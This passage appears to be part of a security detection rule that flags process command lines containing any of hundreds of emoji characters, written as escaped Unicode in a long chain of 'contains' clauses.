'\ud83e\uded1' || evt.Parsed.CommandLine contains '\ud83c\udf3d' || evt.Parsed.CommandLine contains '\ud83e\udd55' || evt.Parsed.CommandLine contains '\ud83e\uded2' || evt.Parsed.CommandLine contains '\ud83e\uddc4' || evt.Parsed.CommandLine contains '\ud83e\uddc5' || evt.Parsed.CommandLine contains '\ud83e\udd54' || evt.Parsed.CommandLine contains '\ud83c\udf60' || evt.Parsed.CommandLine contains '\ud83e\uded8' || evt.Parsed.CommandLine contains '\ud83e\udd50' || evt.Parsed.CommandLine contains '\ud83e\udd6f' || evt.Parsed.CommandLine contains '\ud83c\udf5e' || evt.Parsed.CommandLine contains '\ud83e\udd56' || evt.Parsed.CommandLine contains '\ud83e\udd68' || evt.Parsed.CommandLine contains '\ud83e\uddc0' || evt.Parsed.CommandLine contains '\ud83e\udd5a' || evt.Parsed.CommandLine contains '\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddc8' || evt.Parsed.CommandLine contains '\ud83e\udd5e' || evt.Parsed.CommandLine contains '\ud83e\uddc7' || evt.Parsed.CommandLine contains '\ud83e\udd53' || evt.Parsed.CommandLine contains '\ud83e\udd69' || evt.Parsed.CommandLine contains '\ud83c\udf57' || evt.Parsed.CommandLine contains '\ud83c\udf56' || evt.Parsed.CommandLine contains '\ud83e\uddb4' || evt.Parsed.CommandLine contains '\ud83c\udf2d' || evt.Parsed.CommandLine contains '\ud83c\udf54' || evt.Parsed.CommandLine contains '\ud83c\udf5f' || evt.Parsed.CommandLine contains '\ud83c\udf55' || evt.Parsed.CommandLine contains '\ud83e\uded3' || evt.Parsed.CommandLine contains '\ud83e\udd6a' || evt.Parsed.CommandLine contains '\ud83e\udd59' || evt.Parsed.CommandLine contains '\ud83e\uddc6' || evt.Parsed.CommandLine contains '\ud83c\udf2e' || evt.Parsed.CommandLine contains '\ud83c\udf2f' || evt.Parsed.CommandLine contains '\ud83e\uded4' || evt.Parsed.CommandLine contains '\ud83e\udd57' || evt.Parsed.CommandLine contains '\ud83e\udd58' || evt.Parsed.CommandLine contains '\ud83e\uded5' || evt.Parsed.CommandLine contains '\ud83e\udd6b' || evt.Parsed.CommandLine contains '\ud83c\udf5d' || evt.Parsed.CommandLine contains '\ud83c\udf5c' || evt.Parsed.CommandLine contains '\ud83c\udf72' || evt.Parsed.CommandLine contains '\ud83c\udf5b' || evt.Parsed.CommandLine contains '\ud83c\udf63' || evt.Parsed.CommandLine contains '\ud83c\udf71' || evt.Parsed.CommandLine contains '\ud83e\udd5f' || evt.Parsed.CommandLine contains '\ud83e\uddaa' || evt.Parsed.CommandLine contains '\ud83c\udf64' || evt.Parsed.CommandLine contains '\ud83c\udf59' || evt.Parsed.CommandLine contains '\ud83c\udf5a' || evt.Parsed.CommandLine contains '\ud83c\udf58' || evt.Parsed.CommandLine contains '\ud83c\udf65' || evt.Parsed.CommandLine contains '\ud83e\udd60' || evt.Parsed.CommandLine contains '\ud83e\udd6e' || evt.Parsed.CommandLine contains '\ud83c\udf62' || evt.Parsed.CommandLine contains '\ud83c\udf61' || evt.Parsed.CommandLine contains '\ud83c\udf67' || evt.Parsed.CommandLine contains '\ud83c\udf68' || evt.Parsed.CommandLine contains '\ud83c\udf66' || evt.Parsed.CommandLine contains '\ud83e\udd67' || evt.Parsed.CommandLine contains '\ud83e\uddc1' || evt.Parsed.CommandLine contains '\ud83c\udf70' || evt.Parsed.CommandLine contains '\ud83c\udf82' || evt.Parsed.CommandLine contains '\ud83c\udf6e' || evt.Parsed.CommandLine contains '\ud83c\udf6d' || evt.Parsed.CommandLine contains '\ud83c\udf6c' || evt.Parsed.CommandLine contains '\ud83c\udf6b' || evt.Parsed.CommandLine contains '\ud83c\udf7f' || evt.Parsed.CommandLine contains '\ud83c\udf69' || evt.Parsed.CommandLine contains '\ud83c\udf6a' || evt.Parsed.CommandLine contains '\ud83c\udf30' || evt.Parsed.CommandLine contains '\ud83e\udd5c' || evt.Parsed.CommandLine contains '\ud83c\udf6f' || evt.Parsed.CommandLine contains '\ud83e\udd5b' || evt.Parsed.CommandLine contains '\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uded6' || evt.Parsed.CommandLine contains '\u2615\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf75' || evt.Parsed.CommandLine contains '\ud83e\uddc3' || evt.Parsed.CommandLine contains '\ud83e\udd64' || evt.Parsed.CommandLine contains '\ud83e\uddcb' || evt.Parsed.CommandLine contains '\ud83e\uded9' || evt.Parsed.CommandLine contains '\ud83c\udf76' || evt.Parsed.CommandLine contains '\ud83c\udf7a' || evt.Parsed.CommandLine contains '\ud83c\udf7b' || evt.Parsed.CommandLine contains '\ud83e\udd42' || evt.Parsed.CommandLine contains '\ud83c\udf77' || evt.Parsed.CommandLine contains '\ud83e\uded7' || evt.Parsed.CommandLine contains '\ud83e\udd43' || evt.Parsed.CommandLine contains '\ud83c\udf78' || evt.Parsed.CommandLine contains '\ud83c\udf79' || evt.Parsed.CommandLine contains '\ud83e\uddc9' || evt.Parsed.CommandLine contains '\ud83c\udf7e' || evt.Parsed.CommandLine contains '\ud83e\uddca' || evt.Parsed.CommandLine contains '\ud83e\udd44' || evt.Parsed.CommandLine contains '\ud83c\udf74' || evt.Parsed.CommandLine contains '\ud83c\udf7d' || evt.Parsed.CommandLine contains '\ud83e\udd63' || evt.Parsed.CommandLine contains '\ud83e\udd61' || evt.Parsed.CommandLine contains '\ud83e\udd62' || evt.Parsed.CommandLine contains '\ud83e\uddc2' || evt.Parsed.CommandLine contains '\u26bd\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc0' || evt.Parsed.CommandLine contains '\ud83c\udfc8' || evt.Parsed.CommandLine contains '\u26be\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd4e' || evt.Parsed.CommandLine contains '\ud83c\udfbe' || evt.Parsed.CommandLine contains '\ud83c\udfd0' || evt.Parsed.CommandLine contains '\ud83c\udfc9' || evt.Parsed.CommandLine contains '\ud83e\udd4f' || evt.Parsed.CommandLine contains '\ud83c\udfb1' || evt.Parsed.CommandLine contains '\ud83e\ude80' || evt.Parsed.CommandLine contains '\ud83c\udfd3' || evt.Parsed.CommandLine contains '\ud83c\udff8' || evt.Parsed.CommandLine contains '\ud83c\udfd2' || evt.Parsed.CommandLine contains '\ud83c\udfd1' || evt.Parsed.CommandLine contains '\ud83e\udd4d' || evt.Parsed.CommandLine contains '\ud83c\udfcf' || evt.Parsed.CommandLine contains '\ud83e\ude83' || evt.Parsed.CommandLine contains '\ud83e\udd45' || evt.Parsed.CommandLine contains '\u26f3\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\ude81' || evt.Parsed.CommandLine contains '\ud83c\udff9' || evt.Parsed.CommandLine contains '\ud83c\udfa3' || evt.Parsed.CommandLine contains '\ud83e\udd3f' || evt.Parsed.CommandLine contains '\ud83e\udd4a' || evt.Parsed.CommandLine contains '\ud83e\udd4b' || evt.Parsed.CommandLine contains '\ud83c\udfbd' || evt.Parsed.CommandLine contains '\ud83d\udef9' || evt.Parsed.CommandLine contains '\ud83d\udefc' || evt.Parsed.CommandLine contains '\ud83d\udef7' || evt.Parsed.CommandLine contains '\u26f8' || evt.Parsed.CommandLine contains '\ud83e\udd4c' || evt.Parsed.CommandLine contains '\ud83c\udfbf' || evt.Parsed.CommandLine contains '\u26f7' || evt.Parsed.CommandLine contains '\ud83c\udfc2' || evt.Parsed.CommandLine contains '\ud83e\ude82' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3c\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3c' || evt.Parsed.CommandLine contains '\ud83e\udd3c\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38' || evt.Parsed.CommandLine contains '\ud83e\udd38\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ufe0f\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ufe0f\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3a' || evt.Parsed.CommandLine contains '\ud83e\udd3e\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e' || evt.Parsed.CommandLine contains '\ud83e\udd3e\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ufe0f\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ufe0f\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7' || evt.Parsed.CommandLine contains '\ud83e\uddd8\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8' || evt.Parsed.CommandLine contains '\ud83e\uddd8\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4' || evt.Parsed.CommandLine contains '\ud83c\udfc4\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca' || evt.Parsed.CommandLine contains '\ud83c\udfca\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d' || evt.Parsed.CommandLine contains '\ud83e\udd3d\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3' || evt.Parsed.CommandLine contains '\ud83d\udea3\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7' || evt.Parsed.CommandLine contains '\ud83e\uddd7\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5' || evt.Parsed.CommandLine contains '\ud83d\udeb5\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4' || evt.Parsed.CommandLine contains '\ud83d\udeb4\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc6' || evt.Parsed.CommandLine contains '\ud83e\udd47' || evt.Parsed.CommandLine contains '\ud83e\udd48' || evt.Parsed.CommandLine contains '\ud83e\udd49' || evt.Parsed.CommandLine contains '\ud83c\udfc5' || evt.Parsed.CommandLine contains '\ud83c\udf96' || evt.Parsed.CommandLine contains '\ud83c\udff5' || evt.Parsed.CommandLine contains '\ud83c\udf97' || evt.Parsed.CommandLine contains '\ud83c\udfab' || evt.Parsed.CommandLine contains '\ud83c\udf9f' || evt.Parsed.CommandLine contains '\ud83c\udfaa' || evt.Parsed.CommandLine contains '\ud83e\udd39' || evt.Parsed.CommandLine contains '\ud83e\udd39\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfad' || evt.Parsed.CommandLine contains '\ud83e\ude70' || evt.Parsed.CommandLine contains '\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83c\udfac' || evt.Parsed.CommandLine contains '\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83c\udfa7' || evt.Parsed.CommandLine contains '\ud83c\udfbc' || evt.Parsed.CommandLine contains '\ud83c\udfb9' || evt.Parsed.CommandLine contains '\ud83e\udd41' || evt.Parsed.CommandLine contains '\ud83e\ude98' || evt.Parsed.CommandLine contains '\ud83c\udfb7' || evt.Parsed.CommandLine contains '\ud83c\udfba' || evt.Parsed.CommandLine contains '\ud83e\ude97' || evt.Parsed.CommandLine contains '\ud83c\udfb8' || evt.Parsed.CommandLine contains '\ud83e\ude95' || evt.Parsed.CommandLine contains '\ud83c\udfbb' || evt.Parsed.CommandLine contains '\ud83c\udfb2' || evt.Parsed.CommandLine contains '\u265f' || evt.Parsed.CommandLine contains '\ud83c\udfaf' || evt.Parsed.CommandLine contains '\ud83c\udfb3' || evt.Parsed.CommandLine contains '\ud83c\udfae' || evt.Parsed.CommandLine contains '\ud83c\udfb0' || evt.Parsed.CommandLine contains '\ud83e\udde9' || evt.Parsed.CommandLine contains '\ud83d\ude97' || evt.Parsed.CommandLine contains '\ud83d\ude95' || evt.Parsed.CommandLine contains '\ud83d\ude99' || evt.Parsed.CommandLine contains '\ud83d\ude8c' || evt.Parsed.CommandLine contains '\ud83d\ude8e' || evt.Parsed.CommandLine contains '\ud83c\udfce' || evt.Parsed.CommandLine contains '\ud83d\ude93' || evt.Parsed.CommandLine contains '\ud83d\ude91' || evt.Parsed.CommandLine contains '\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\ude90' || evt.Parsed.CommandLine contains '\ud83d\udefb' || evt.Parsed.CommandLine contains '\ud83d\ude9a' || evt.Parsed.CommandLine contains '\ud83d\ude9b' || evt.Parsed.CommandLine contains '\ud83d\ude9c' || evt.Parsed.CommandLine contains '\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udef4' || evt.Parsed.CommandLine contains '\ud83d\udeb2' || evt.Parsed.CommandLine contains '\ud83d\udef5' || evt.Parsed.CommandLine contains '\ud83c\udfcd' || evt.Parsed.CommandLine contains '\ud83d\udefa' || evt.Parsed.CommandLine contains '\ud83d\udea8' || evt.Parsed.CommandLine contains '\ud83d\ude94' || evt.Parsed.CommandLine contains '\ud83d\ude8d' || evt.Parsed.CommandLine contains '\ud83d\ude98' || evt.Parsed.CommandLine contains '\ud83d\ude96' || evt.Parsed.CommandLine contains '\ud83d\udede' || evt.Parsed.CommandLine contains '\ud83d\udea1' || evt.Parsed.CommandLine contains '\ud83d\udea0' || evt.Parsed.CommandLine contains '\ud83d\ude9f' || evt.Parsed.CommandLine contains '\ud83d\ude83' || evt.Parsed.CommandLine contains '\ud83d\ude8b' || evt.Parsed.CommandLine contains '\ud83d\ude9e' || evt.Parsed.CommandLine contains '\ud83d\ude9d' || evt.Parsed.CommandLine contains '\ud83d\ude84' || evt.Parsed.CommandLine contains '\ud83d\ude85' || evt.Parsed.CommandLine contains '\ud83d\ude88' || evt.Parsed.CommandLine contains '\ud83d\ude82' || evt.Parsed.CommandLine contains '\ud83d\ude86' || evt.Parsed.CommandLine contains '\ud83d\ude87' || evt.Parsed.CommandLine contains '\ud83d\ude8a' || evt.Parsed.CommandLine contains '\ud83d\ude89' || evt.Parsed.CommandLine contains '\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeeb' || evt.Parsed.CommandLine contains '\ud83d\udeec' || evt.Parsed.CommandLine contains '\ud83d\udee9' || evt.Parsed.CommandLine contains '\ud83d\udcba' || evt.Parsed.CommandLine contains '\ud83d\udef0' || evt.Parsed.CommandLine contains '\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udef8' || evt.Parsed.CommandLine contains '\ud83d\ude81' || evt.Parsed.CommandLine contains '\ud83d\udef6' || evt.Parsed.CommandLine contains '\u26f5\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea4' || evt.Parsed.CommandLine contains '\ud83d\udee5' || evt.Parsed.CommandLine contains '\ud83d\udef3' || evt.Parsed.CommandLine contains '\u26f4' || evt.Parsed.CommandLine contains '\ud83d\udea2' || evt.Parsed.CommandLine contains '\u2693\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udedf' || evt.Parsed.CommandLine contains '\ud83e\ude9d' || evt.Parsed.CommandLine contains '\u26fd\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea7' || evt.Parsed.CommandLine contains '\ud83d\udea6' || evt.Parsed.CommandLine contains '\ud83d\udea5' || evt.Parsed.CommandLine contains '\ud83d\ude8f' || evt.Parsed.CommandLine contains '\ud83d\uddfa' || evt.Parsed.CommandLine contains '\ud83d\uddff' || evt.Parsed.CommandLine contains '\ud83d\uddfd' || evt.Parsed.CommandLine contains '\ud83d\uddfc' || evt.Parsed.CommandLine contains '\ud83c\udff0' || evt.Parsed.CommandLine contains '\ud83c\udfef' || evt.Parsed.CommandLine contains '\ud83c\udfdf' || evt.Parsed.CommandLine contains '\ud83c\udfa1' || evt.Parsed.CommandLine contains '\ud83c\udfa2' || evt.Parsed.CommandLine contains '\ud83d\udedd' || evt.Parsed.CommandLine contains '\ud83c\udfa0' || evt.Parsed.CommandLine contains '\u26f2\ufe0f' || evt.Parsed.CommandLine contains '\u26f1' || evt.Parsed.CommandLine contains '\ud83c\udfd6' || evt.Parsed.CommandLine contains '\ud83c\udfdd' || evt.Parsed.CommandLine contains '\ud83c\udfdc' || evt.Parsed.CommandLine contains '\ud83c\udf0b' || evt.Parsed.CommandLine contains '\u26f0' || evt.Parsed.CommandLine contains '\ud83c\udfd4' || evt.Parsed.CommandLine contains '\ud83d\uddfb' || evt.Parsed.CommandLine contains '\ud83c\udfd5' || evt.Parsed.CommandLine contains '\u26fa\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\uded6' || evt.Parsed.CommandLine contains '\ud83c\udfe0' || evt.Parsed.CommandLine contains '\ud83c\udfe1' || evt.Parsed.CommandLine contains '\ud83c\udfd8' || evt.Parsed.CommandLine contains '\ud83c\udfda' || evt.Parsed.CommandLine contains '\ud83c\udfd7' || evt.Parsed.CommandLine contains '\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83c\udfe2' || evt.Parsed.CommandLine contains '\ud83c\udfec' || evt.Parsed.CommandLine contains '\ud83c\udfe3' || evt.Parsed.CommandLine contains '\ud83c\udfe4' || evt.Parsed.CommandLine contains '\ud83c\udfe5' || evt.Parsed.CommandLine contains '\ud83c\udfe6' || evt.Parsed.CommandLine contains '\ud83c\udfe8' || evt.Parsed.CommandLine contains '\ud83c\udfea' || evt.Parsed.CommandLine contains '\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83c\udfe9' || evt.Parsed.CommandLine contains '\ud83d\udc92' || evt.Parsed.CommandLine contains '\ud83c\udfdb' || evt.Parsed.CommandLine contains '\u26ea\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd4c' || evt.Parsed.CommandLine contains '\ud83d\udd4d' || evt.Parsed.CommandLine contains '\ud83d\uded5' || evt.Parsed.CommandLine contains '\ud83d\udd4b' || evt.Parsed.CommandLine contains '\u26e9' || evt.Parsed.CommandLine contains '\ud83d\udee4' || evt.Parsed.CommandLine contains '\ud83d\udee3' || evt.Parsed.CommandLine contains '\ud83d\uddfe' || evt.Parsed.CommandLine contains '\ud83c\udf91' || evt.Parsed.CommandLine contains '\ud83c\udfde' || evt.Parsed.CommandLine contains '\ud83c\udf05' || evt.Parsed.CommandLine contains '\ud83c\udf04' || evt.Parsed.CommandLine contains '\ud83c\udf20' || evt.Parsed.CommandLine contains '\ud83c\udf87' || evt.Parsed.CommandLine contains '\ud83c\udf86' || evt.Parsed.CommandLine contains '\ud83c\udf07' || evt.Parsed.CommandLine contains '\ud83c\udf06' || evt.Parsed.CommandLine contains '\ud83c\udfd9' || evt.Parsed.CommandLine contains '\ud83c\udf03' || evt.Parsed.CommandLine contains '\ud83c\udf0c' || evt.Parsed.CommandLine contains '\ud83c\udf09' || evt.Parsed.CommandLine contains '\ud83c\udf01' || evt.Parsed.CommandLine contains '\u231a\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcf1' || evt.Parsed.CommandLine contains '\ud83d\udcf2' || evt.Parsed.CommandLine contains '\ud83d\udcbb' || evt.Parsed.CommandLine contains '\u2328\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udda5' || evt.Parsed.CommandLine contains '\ud83d\udda8' || evt.Parsed.CommandLine contains '\ud83d\uddb1' || evt.Parsed.CommandLine contains '\ud83d\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udd79' || evt.Parsed.CommandLine contains '\ud83d\udddc' || evt.Parsed.CommandLine contains '\ud83d\udcbd' || evt.Parsed.CommandLine contains '\ud83d\udcbe' || evt.Parsed.CommandLine contains '\ud83d\udcbf' || evt.Parsed.CommandLine contains '\ud83d\udcc0' || evt.Parsed.CommandLine contains '\ud83d\udcfc' || evt.Parsed.CommandLine contains '\ud83d\udcf7' || evt.Parsed.CommandLine contains '\ud83d\udcf8' || evt.Parsed.CommandLine contains '\ud83d\udcf9' || evt.Parsed.CommandLine contains '\ud83c\udfa5' || evt.Parsed.CommandLine contains '\ud83d\udcfd' || evt.Parsed.CommandLine contains '\ud83c\udf9e' || evt.Parsed.CommandLine contains '\ud83d\udcde' || evt.Parsed.CommandLine contains '\u260e\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcdf' || evt.Parsed.CommandLine contains '\ud83d\udce0' || evt.Parsed.CommandLine contains '\ud83d\udcfa' || evt.Parsed.CommandLine contains '\ud83d\udcfb' || evt.Parsed.CommandLine contains '\ud83c\udf99' || evt.Parsed.CommandLine contains '\ud83c\udf9a' || evt.Parsed.CommandLine contains '\ud83c\udf9b' || evt.Parsed.CommandLine contains '\ud83e\udded' || evt.Parsed.CommandLine contains '\u23f1' || evt.Parsed.CommandLine contains '\u23f2' || evt.Parsed.CommandLine contains '\u23f0' || evt.Parsed.CommandLine contains '\ud83d\udd70' || evt.Parsed.CommandLine contains '\u231b\ufe0f' || evt.Parsed.CommandLine contains '\u23f3' || evt.Parsed.CommandLine contains '\ud83d\udce1' || evt.Parsed.CommandLine contains '\ud83d\udd0b' || evt.Parsed.CommandLine contains '\ud83e\udeab' || evt.Parsed.CommandLine contains '\ud83d\udd0c' || evt.Parsed.CommandLine contains '\ud83d\udca1' || evt.Parsed.CommandLine contains '\ud83d\udd26' || evt.Parsed.CommandLine contains '\ud83d\udd6f' || evt.Parsed.CommandLine contains '\ud83e\ude94' || evt.Parsed.CommandLine contains '\ud83e\uddef' || evt.Parsed.CommandLine contains '\ud83d\udee2' || evt.Parsed.CommandLine contains '\ud83d\udcb8' || evt.Parsed.CommandLine contains '\ud83d\udcb5' || evt.Parsed.CommandLine contains '\ud83d\udcb4' || evt.Parsed.CommandLine contains '\ud83d\udcb6' || evt.Parsed.CommandLine contains '\ud83d\udcb7' || evt.Parsed.CommandLine contains '\ud83e\ude99' || evt.Parsed.CommandLine contains '\ud83d\udcb0' || evt.Parsed.CommandLine contains '\ud83d\udcb3' || evt.Parsed.CommandLine contains '\ud83d\udc8e' || evt.Parsed.CommandLine contains '\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\ude9c' || evt.Parsed.CommandLine contains '\ud83e\uddf0' || evt.Parsed.CommandLine contains '\ud83e\ude9b' || evt.Parsed.CommandLine contains '\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udd28' || evt.Parsed.CommandLine contains '\u2692' || evt.Parsed.CommandLine contains '\ud83d\udee0' || evt.Parsed.CommandLine contains '\u26cf' || evt.Parsed.CommandLine contains '\ud83e\ude9a' || evt.Parsed.CommandLine contains '\ud83d\udd29' || evt.Parsed.CommandLine contains '\u2699\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udea4' || evt.Parsed.CommandLine contains '\ud83e\uddf1' || evt.Parsed.CommandLine contains '\u26d3' || evt.Parsed.CommandLine contains '\ud83e\uddf2' || evt.Parsed.CommandLine contains '\ud83d\udd2b' || evt.Parsed.CommandLine contains '\ud83d\udca3' || evt.Parsed.CommandLine contains '\ud83e\udde8' || evt.Parsed.CommandLine contains '\ud83e\ude93' || evt.Parsed.CommandLine contains '\ud83d\udd2a' || evt.Parsed.CommandLine contains '\ud83d\udde1' || evt.Parsed.CommandLine contains '\u2694\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udee1' || evt.Parsed.CommandLine contains '\ud83d\udeac' || evt.Parsed.CommandLine contains '\u26b0\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udea6' || evt.Parsed.CommandLine contains '\u26b1\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udffa' || evt.Parsed.CommandLine contains '\ud83d\udd2e' || evt.Parsed.CommandLine contains '\ud83d\udcff' || evt.Parsed.CommandLine contains '\ud83e\uddff' || evt.Parsed.CommandLine contains '\ud83e\udeac' || evt.Parsed.CommandLine contains '\ud83d\udc88' || evt.Parsed.CommandLine contains '\u2697\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd2d' || evt.Parsed.CommandLine contains '\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udd73' || evt.Parsed.CommandLine contains '\ud83e\ude79' || evt.Parsed.CommandLine contains '\ud83e\ude7a' || evt.Parsed.CommandLine contains '\ud83e\ude7b' || evt.Parsed.CommandLine contains '\ud83e\ude7c' || evt.Parsed.CommandLine contains '\ud83d\udc8a' || evt.Parsed.CommandLine contains '\ud83d\udc89' || evt.Parsed.CommandLine contains '\ud83e\ude78' || evt.Parsed.CommandLine contains '\ud83e\uddec' || evt.Parsed.CommandLine contains '\ud83e\udda0' || evt.Parsed.CommandLine contains '\ud83e\uddeb' || evt.Parsed.CommandLine contains '\ud83e\uddea' || evt.Parsed.CommandLine contains '\ud83c\udf21' || evt.Parsed.CommandLine contains '\ud83e\uddf9' || evt.Parsed.CommandLine contains '\ud83e\udea0' || evt.Parsed.CommandLine contains '\ud83e\uddfa' || evt.Parsed.CommandLine contains '\ud83e\uddfb' || evt.Parsed.CommandLine contains '\ud83d\udebd' || evt.Parsed.CommandLine contains '\ud83d\udeb0' || evt.Parsed.CommandLine contains '\ud83d\udebf' || evt.Parsed.CommandLine contains '\ud83d\udec1' || evt.Parsed.CommandLine contains '\ud83d\udec0' || evt.Parsed.CommandLine contains '\ud83e\uddfc' || evt.Parsed.CommandLine contains '\ud83e\udea5' || evt.Parsed.CommandLine contains '\ud83e\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddfd' || evt.Parsed.CommandLine contains '\ud83e\udea3' || evt.Parsed.CommandLine contains '\ud83e\uddf4' || evt.Parsed.CommandLine contains '\ud83d\udece' || evt.Parsed.CommandLine contains '\ud83d\udd11' || evt.Parsed.CommandLine contains '\ud83d\udddd' || evt.Parsed.CommandLine contains '\ud83d\udeaa' || evt.Parsed.CommandLine contains '\ud83e\ude91' || evt.Parsed.CommandLine contains '\ud83d\udecb' || evt.Parsed.CommandLine contains '\ud83d\udecf' || evt.Parsed.CommandLine contains '\ud83d\udecc' || evt.Parsed.CommandLine contains '\ud83e\uddf8' || evt.Parsed.CommandLine contains '\ud83e\ude86' || evt.Parsed.CommandLine contains '\ud83d\uddbc' || evt.Parsed.CommandLine contains '\ud83e\ude9e' || evt.Parsed.CommandLine contains '\ud83e\ude9f' || evt.Parsed.CommandLine contains '\ud83d\udecd' || evt.Parsed.CommandLine contains '\ud83d\uded2' || evt.Parsed.CommandLine contains '\ud83c\udf81' || evt.Parsed.CommandLine contains '\ud83c\udf88' || evt.Parsed.CommandLine contains '\ud83c\udf8f' || evt.Parsed.CommandLine contains '\ud83c\udf80' || evt.Parsed.CommandLine contains '\ud83e\ude84' || evt.Parsed.CommandLine contains '\ud83e\ude85' || evt.Parsed.CommandLine contains '\ud83c\udf8a' || evt.Parsed.CommandLine contains '\ud83c\udf89' || evt.Parsed.CommandLine contains '\ud83e\udea9' || evt.Parsed.CommandLine contains '\ud83c\udf8e' || evt.Parsed.CommandLine contains '\ud83c\udfee' || evt.Parsed.CommandLine contains '\ud83c\udf90' || evt.Parsed.CommandLine contains '\ud83e\udde7' || evt.Parsed.CommandLine contains '\u2709\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udce9' || evt.Parsed.CommandLine contains '\ud83d\udce8' || evt.Parsed.CommandLine contains '\ud83d\udce7' || evt.Parsed.CommandLine contains '\ud83d\udc8c' || evt.Parsed.CommandLine contains '\ud83d\udce5' || evt.Parsed.CommandLine contains '\ud83d\udce4' || evt.Parsed.CommandLine contains '\ud83d\udce6' || evt.Parsed.CommandLine contains '\ud83c\udff7' || evt.Parsed.CommandLine contains '\ud83e\udea7' || evt.Parsed.CommandLine contains '\ud83d\udcea' || evt.Parsed.CommandLine contains '\ud83d\udceb' || evt.Parsed.CommandLine contains '\ud83d\udcec' || evt.Parsed.CommandLine contains '\ud83d\udced' || evt.Parsed.CommandLine contains '\ud83d\udcee' || evt.Parsed.CommandLine contains '\ud83d\udcef' || evt.Parsed.CommandLine contains '\ud83d\udcdc' || evt.Parsed.CommandLine contains '\ud83d\udcc3' || evt.Parsed.CommandLine contains '\ud83d\udcc4' || evt.Parsed.CommandLine contains '\ud83d\udcd1' || evt.Parsed.CommandLine contains '\ud83e\uddfe' || evt.Parsed.CommandLine contains '\ud83d\udcca' || evt.Parsed.CommandLine contains '\ud83d\udcc8' || evt.Parsed.CommandLine contains '\ud83d\udcc9' || evt.Parsed.CommandLine contains '\ud83d\uddd2' || evt.Parsed.CommandLine contains '\ud83d\uddd3' || evt.Parsed.CommandLine contains '\ud83d\udcc6' || evt.Parsed.CommandLine contains '\ud83d\udcc5' || evt.Parsed.CommandLine contains '\ud83d\uddd1' || evt.Parsed.CommandLine contains '\ud83e\udeaa' || evt.Parsed.CommandLine contains '\ud83d\udcc7' || 